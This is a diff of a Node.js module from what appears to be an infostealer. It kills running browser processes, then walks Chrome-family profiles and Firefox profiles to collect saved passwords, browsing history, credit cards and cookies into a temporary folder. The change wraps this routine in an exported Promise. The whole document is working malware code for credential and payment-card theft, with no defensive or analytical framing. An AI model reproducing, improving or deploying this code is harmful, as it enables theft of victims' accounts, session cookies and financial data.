@@ -114,24 +114,27 @@ const kill = (processes) => {
 };
 
 if (!existsSync(join(getTempFolder(), 'Browsers'))) mkdirSync(join(getTempFolder(), 'Browsers'));
-kill(browsersProcesses).then(() => {
-  Object.keys(browsers).forEach((browser) => {
-    const path = browsers[browser];
-    const isFirefox = browser === 'Firefox';
-    if (isFirefox && !existsSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox')))
-      mkdirSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox'));
-    if (existsSync(path)) {
-      ['passwords', 'history', 'creditCards', 'cookies'].forEach(fn => {
-        (isFirefox ?
-          fs.readdirSync(path) :
-          ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
-        ).forEach(profile => {
-          isFirefox ?
-            firefox[fn](path, profile) :
-            chrome[fn](browser, path, profile);
+module.exports = new Promise((resolve) => {
+  kill(browsersProcesses).then(() => {
+    Object.keys(browsers).forEach((browser) => {
+      const path = browsers[browser];
+      const isFirefox = browser === 'Firefox';
+      if (existsSync(path)) {
+        if (isFirefox && !existsSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox')))
+          mkdirSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox'));
+        ['passwords', 'history', 'creditCards', 'cookies'].forEach(fn => {
+          (isFirefox ?
+            fs.readdirSync(path) :
+            ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
+          ).forEach(profile => {
+            isFirefox ?
+              firefox[fn](path, profile) :
+              chrome[fn](browser, path, profile);
+          });
         });
-      });
-    }
+      }
+    });
+    resolve();
   });
 });
 
